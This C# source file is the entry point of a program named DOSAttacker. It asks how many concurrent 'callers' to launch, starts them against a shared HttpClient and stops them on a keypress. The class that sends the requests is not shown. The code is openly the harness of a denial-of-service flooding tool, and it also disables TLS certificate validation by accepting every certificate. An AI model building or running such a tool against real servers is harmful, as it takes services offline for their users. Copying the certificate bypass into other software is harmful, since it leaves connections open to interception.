using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace DOSAttacker
{
    class DOSAttackerMain
    {
        private static readonly List<Caller> _callers = new List<Caller>();

        static void Main()
        {
            int callersCount = AskForCallerCount();

            using (var httpClientHandler = new HttpClientHandler())
            {
                httpClientHandler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => { return true; };
                using (var client = new HttpClient(httpClientHandler))
                {
                    for (int i = 0; i < callersCount; i++)
                    {
                        _callers.Add(new Caller(i, client));
                    }

                    Console.ReadKey();
                    StopCalling(callersCount);
                }
            }
        }

        private static void StopCalling(int callersCount)
        {
            try
            {
                var callingTasks = new Task[callersCount];
                for (int i = 0; i < callersCount; i++)
                {
                    callingTasks[i] = _callers[i].Stop();
                }

                Task.WaitAll(callingTasks);

                Console.WriteLine("ALL DONE! :)");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"exception: {ex.Message}");
            }

        }

        private static int AskForCallerCount()
        {
            int callersCount = 0;
            while (callersCount == 0)
            {
                Console.WriteLine("How many callers do you want? (Write a positive number)");
                try
                {
                    callersCount = Int32.Parse(Console.ReadLine() ?? "0");
                }
                catch (Exception)
                {
                    Console.WriteLine("Couldn't parse this. Try again");
                }
            }
            return callersCount;
        }
    }
}